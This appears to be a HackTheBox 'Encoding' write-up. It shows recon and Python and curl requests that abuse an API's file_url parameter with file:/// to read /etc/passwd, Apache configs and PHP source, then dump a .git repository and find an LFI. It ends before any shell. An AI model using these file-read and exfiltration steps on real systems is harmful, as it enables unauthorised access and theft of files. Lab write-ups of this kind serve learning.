### Encoding HackTheBox

### Difficulty = Medium

### IP Address = 10.10.11.198

Nmap Scan:

```
└─$ nmap -sCV -A 10.10.11.198 -p22,80 -oN nmapscan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-12 12:29 WAT
Nmap scan report for 10.10.11.198
Host is up (0.75s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: HaxTables
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.55 seconds

```

Checking the web shows that its used for converting string and integer
![image](https://user-images.githubusercontent.com/113513376/218308419-e7bbbb1f-6448-4966-9c6e-af53c2e0c16e.png)

The api usage shows how this conversion can be done
![image](https://user-images.githubusercontent.com/113513376/218308510-43fa9d20-47f7-4861-87e3-43a57a2f7d05.png)

Also it shows the vhost i'll add that to my `/etc/hosts` file

```
─$ cat /etc/hosts | grep htb
10.10.11.198    api.haxtables.htb haxtables.htb
```

Now noticing the url schema shows a possible but i tried it doesn't seem to work 

Anyways after looking through the api request that can be sent i found this interesting

```
    import requests

    json_data = {
        'action': 'str2hex',
        'file_url' : 'http://example.com/data.txt'

    }

    response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
    print(response.text)
```

We see that we can specify the url file to convert i'll try a basic thing now note that this is a python script

Trying it shows it works
![image](https://user-images.githubusercontent.com/113513376/218308976-87341f21-6907-4901-9fba-9273ef62d27d.png)

I can try now to include local files using the `file:///` wrapper

```
──(mark㉿haxor)-[~/Desktop/B2B/HTB/Encoding]
└─$ nano apisend.py
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Encoding]
└─$ cat apisend.py 
import requests

json_data = {
    'action': 'str2hex',
    'file_url' : 'file:///etc/passwd'
}

response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
print(response.text)
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Encoding]
└─$ python3 apisend.py
{"data":"726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3130353a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a706f6c6c696e6174653a783a3130353a313a3a2f7661722f63616368652f706f6c6c696e6174653a2f62696e2f66616c73650a737368643a783a3130363a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a7379736c6f673a783a3130373a3131333a3a2f686f6d652f7379736c6f673a2f7573722f7362696e2f6e6f6c6f67696e0a75756964643a783a3130383a3131343a3a2f72756e2f75756964643a2f7573722f7362696e2f6e6f6c6f67696e0a74637064756d703a783a3130393a3131353a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a7473733a783a3131303a3131363a54504d20736f66747761726520737461636b2c2c2c3a2f7661722f6c69622f74706d3a2f62696e2f66616c73650a6c616e6473636170653a783a3131313a3131373a3a2f7661722f6c69622f6c616e6473636170653a2f7573722f7362696e2f6e6f6c6f67696e0a7573626d75783a783a3131323a34363a7573626d7578206461656d6f6e2c2c2c3a2f7661722f6c69622f7573626d75783a2f7573722f7362696e2f6e6f6c6f67696e0a7376633a783a313030303a313030303a7376633a2f686f6d652f7376633a2f62696e2f626173680a6c78643a783a3939393a3130303a3a2f7661722f736e61702f6c78642f636f6d6d6f6e2f6c78643a2f62696e2f66616c73650a66777570642d726566726573683a783a3131333a3132303a66777570642d7265667265736820757365722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a"}
```

Now i can decode it using xxd
![image](https://user-images.githubusercontent.com/113513376/218310058-5c0f76bc-7316-485c-b39a-76efda0ba4fe.png)

It works cool with this file read vulnerability i can leverage it to enumerate other vhosts and files in the box

Reading the /etc/hosts shows other vhosts
![image](https://user-images.githubusercontent.com/113513376/218310109-40e9e48e-a23a-428d-88d9-737dec0d77b1.png)

I can confirm the full path by reading the apache config file since the web server uses apache
![image](https://user-images.githubusercontent.com/113513376/218310172-bb8d4c2d-b948-4bfc-bf09-6549fa135ea5.png)

By default the full path of apache config is `/etc/apache2/sites-enabled/000-default.conf`
![image](https://user-images.githubusercontent.com/113513376/218310268-ae12c7f6-cd84-4d14-9016-b2ff12c9b72f.png)

```
<VirtualHost *:80>
        ServerName haxtables.htb
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html


        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>


<VirtualHost *:80>
        ServerName api.haxtables.htb
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/api
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
        ServerName image.haxtables.htb
        ServerAdmin webmaster@localhost
        
        DocumentRoot /var/www/image

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        #SecRuleEngine On

        <LocationMatch />
                SecAction initcol:ip=%{REMOTE_ADDR},pass,nolog,id:'200001'
                SecAction "phase:5,deprecatevar:ip.somepathcounter=1/1,pass,nolog,id:'200002'"
                SecRule IP:SOMEPATHCOUNTER "@gt 5" "phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:'200003'"
                SecAction "phase:2,pass,setvar:ip.somepathcounter=+1,nolog,id:'200004'"
                Header always set Retry-After "10" env=RATELIMITED
        </LocationMatch>

        ErrorDocument 429 "Rate Limit Exceeded"

        <Directory /var/www/image>
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </DIrectory>

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

I'll update my /etc/hosts file

```
└─$ cat /etc/hosts | grep htb
10.10.11.198    api.haxtables.htb haxtables.htb image.haxtables.htb 
```

Now we know that the api sends the file given to a url `http://api.haxtables.htb/v3/tools/string/index.php` i'll use the file read request to read the index.php file
![image](https://user-images.githubusercontent.com/113513376/218310449-7c7de54b-de83-45f4-9c88-095da575c7d9.png)

Reading the php code after decoding gives this
![image](https://user-images.githubusercontent.com/113513376/218310498-3f5df9e2-ae0a-4ec0-b4ec-ca0aca12c972.png)

This is the code that does the convert funtion looking at it shows it includes `../../../utils.php`

I'll read the content
![image](https://user-images.githubusercontent.com/113513376/218310592-e703f591-a1c6-4add-8f13-f5a2a397ffb6.png)

Decoding it 
![image](https://user-images.githubusercontent.com/113513376/218310663-fecb10b4-bfcc-44c6-ac17-377b62f97f8b.png)

The php code does quite some function but what got me interested is this portion of the code
![image](https://user-images.githubusercontent.com/113513376/218310702-9bf4f257-f018-4ecb-b606-d2e57d806e96.png)

From that we know that it's checks is the hostname is 127.0.0.1 meaning if the ip isn't coming from localhost we get access denied 

Reading the image vhost index.php file shows this
![image](https://user-images.githubusercontent.com/113513376/218310961-31f0a4e1-c377-479e-98f1-e626547f93bf.png)

It includes utils.php so i'll read it also 
![image](https://user-images.githubusercontent.com/113513376/218311062-76870b33-c353-427d-a2ca-3986c4d0264f.png)

Decoding it shows this
![image](https://user-images.githubusercontent.com/113513376/218311125-3c34d9c8-b82c-4bb3-a615-a133aaaade78.png)
![image](https://user-images.githubusercontent.com/113513376/218311132-630d60da-e647-438d-bce2-393ae4e0cbc2.png)

Using chatgpt i got what the get_url_content does lool

```
This is a PHP function that uses the cURL library to fetch the contents of a given URL.

The function starts by parsing the host of the URL using the parse_url function and checking if the host's IP address is "127.0.0.1", which is a special IP address used to represent the local host on a computer. If the host's IP is "127.0.0.1", the function returns a JSON-encoded message saying "Unacceptable URL".

Next, the function initializes a cURL session using curl_init. The URL to fetch is set using curl_setopt with CURLOPT_URL option. The function then sets the allowed protocols to only HTTP and HTTPS using cURLOPT_PROTOCOLS and CURLOPT_REDIR_PROTOCOLS. The timeout is set to 2 seconds using CURLOPT_CONNECTTIMEOUT and CURLOPT_RETURNTRANSFER is set to 1 to return the contents of the URL as a string.

Finally, the function fetches the contents of the URL using curl_exec and closes the cURL session using curl_close. The contents of the URL are then returned.
```

Basically it checks if the connection is coming from localhost if it isn't we get an error else it executes the curl command

Noticing another function called git_status, git_log & git_commit it runs those command so maybe there's a git project in image vhost

```
function git_status()
{
    $status = shell_exec('cd /var/www/image && /usr/bin/git status');
    return $status;
}

function git_log($file)
{
    $log = shell_exec('cd /var/www/image && /ust/bin/git log --oneline "' . addslashes($file) . '"');
    return $log;
}

function git_commit()
{
    $commit = shell_exec('sudo -u svc /var/www/image/scripts/git-commit.sh');
    return $commit;
}
?>
```

Accessing the image vhost shows what we expected lool 
![image](https://user-images.githubusercontent.com/113513376/218311419-bd6a9542-4508-49f3-824f-d5b3e8c4988f.png)

Anyways to dump the .git project is going to be a problem cause we can't directly dump it from the image vhost since our ip isn't coming from localhost

To get around this i'll leverage the file inclusion to dump the git project

To achieve a successfull dump i'll modify the curl query with the following parameters: the content-type in the header will be application/json, a binary file will be sent with the data specified in the --data-binary argument, which includes the str2hex action values and the address URL of the file file:///var/www/image/.git/$objname in the haxtables API http://api.haxtables.htb/v3/tools/string/index.php. The response will be processed with jq to extract only the relevant data and then xxd will be used to convert the hexadecimal output to a binary file which will be saved to $target

```
└─$ curl -X POST -H 'Content-Type: application/json' --data-binary "{\"action\": \"str2hex\", \"file_url\": \"file:///var/www/image/.git/$objname\"}" 'http://api.haxtables.htb/v3/tools/string/index.php' | jq .data | xxd -r -p > "$target"

└─$ ./gitdumper.sh http://image.haxtables.htb/.git/ git
[*] Destination folder does not exist
[+] Creating git/.git/
[+] Downloaded: HEAD
[+] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[+] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[+] Downloaded: refs/remotes/origin/HEAD
[+] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[+] Downloaded: logs/refs/remotes/origin/HEAD
[+] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: /refs/wip/index/refs/heads/master
[+] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/9c/17e5362e5ce2f30023992daad5b74cc562750b
[+] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/a8/5ddf4be9e06aa275d26dfaa58ef407ad2c8526
[+] Downloaded: objects/30/617cae3686895c80152d93a0568e3d0b6a0c49
[+] Downloaded: objects/a1/ac03b768b16cb11819d2ba9bc9016e18c2f1d9
[+] Downloaded: objects/26/c6c873fe81c801d731e417bf5d92e5bfa317d2
[+] Downloaded: objects/9a/515b22daea1a74bbcf5d348ad9339202a8edd6
[+] Downloaded: objects/2a/a032b5df9bbaeedff30b6e13be938e48cae5f4
[+] Downloaded: objects/72/f0e39a9438fc0f915f63e2f26b762eb170cf8b
[+] Downloaded: objects/e0/74c833c28d3b024eeea724cf892a440f89a5aa
[+] Downloaded: objects/ec/9b154d84cab1888e2724c1083bf97eb57837c9
[+] Downloaded: objects/31/f5bbb2ab636f275e1db54e594911646a6e2d16
[+] Downloaded: objects/2d/600ee8a453abd9bd515c41c8fa786b95f96f82
[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
[+] Downloaded: objects/3d/6e60659977f6c6d900f094ab0e33ed594c8dab
[+] Downloaded: objects/f9/d432448807f47dfd13cb71acc3fd6890f21ee0
[+] Downloaded: objects/c1/308cdc2b0fac3eb5b1e0872cdec44941ff22f5
[+] Downloaded: objects/e4/13857aba2ad6d1692337fa09d9ccf00f64aad0
[+] Downloaded: objects/62/370b37f2f05b910c76c23d1d4ce9f7e3413ea6
```

So i'll extract all commits using extrator.sh

```
└─$ ./extractor.sh git extracted
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 9c17e5362e5ce2f30023992daad5b74cc562750b
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/action_handler.php
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/image2pdf.php
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets/img
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/assets/img/forestbridge.jpg
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/includes
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/includes/coming_soon.html
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/index.php
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/scripts
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/scripts/git-commit.sh
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/0-9c17e5362e5ce2f30023992daad5b74cc562750b/utils.php
[+] Found commit: a85ddf4be9e06aa275d26dfaa58ef407ad2c8526
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/actions
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/actions/action_handler.php
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/actions/image2pdf.php
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/assets
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/assets/img
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/assets/img/forestbridge.jpg
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/includes
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/includes/coming_soon.html
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/index.php
[+] Found folder: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/scripts
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/scripts/git-commit.sh
[+] Found file: /home/mark/Desktop/B2B/HTB/Encoding/extracted/1-a85ddf4be9e06aa275d26dfaa58ef407ad2c8526/utils.php
```

We see a file called `action_handler.php` by looking at the commits being dumped

Lets read its content

```
└─$ cat 0-9c17e5362e5ce2f30023992daad5b74cc562750b/actions/action_handler.php
```

It shows 
![image](https://user-images.githubusercontent.com/113513376/218315343-312a33f3-26a0-40a4-9a16-a0077db54828.png)

Noticing the code shows it vuln to LFI via the GET [page] parameter

Now i'll enumerate for files using .php as an extension to be added

```
└─$ gobuster dir -u http://haxtables.htb/ -w /usr/share/wordlists/dirb/common.txt -x php
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://haxtables.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/12 14:58:59 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://haxtables.htb/assets/]
/handler.php          (Status: 200) [Size: 38]
/includes             (Status: 301) [Size: 317] [--> http://haxtables.htb/includes/]
/index.php            (Status: 200) [Size: 1999]
/index.php            (Status: 200) [Size: 1999]
/server-status        (Status: 403) [Size: 278]
Progress: 9220 / 9230 (99.89%)
===============================================================
2023/02/12 15:02:59 Finished
===============================================================

```

Checking the handler.php file shows it requires a parameter

```
└─$ curl http://haxtables.htb/handler.php
{"message":"Insufficient parameters!"}  
```

Using the file inclusion i'll read the content of handler.php
![image](https://user-images.githubusercontent.com/113513376/218315717-7da8222c-7eda-422c-a190-251497f8dd7f.png)

```
└─$ python3 api_send.py| jq .data | xxd -r -p
<?php
include_once '../api/utils.php';

if (isset($_FILES['data_file'])) {
    $is_file = true;
    $action = $_POST['action'];
    $uri_path = $_POST['uri_path'];
    $data = $_FILES['data_file']['tmp_name'];

} else {
    $is_file = false;
    $jsondata = json_decode(file_get_contents('php://input'), true);
    $action = $jsondata['action'];
    $data = $jsondata['data'];
    $uri_path = $jsondata['uri_path'];



    if ( empty($jsondata) || !array_key_exists('action', $jsondata) || !array_key_exists('uri_path', $jsondata)) 
    {
        echo jsonify(['message' => 'Insufficient parameters!']);
        // echo jsonify(['message' => file_get_contents('php://input')]);

    }

}

$response = make_api_call($action, $data, $uri_path, $is_file);
echo $response;

?>
```



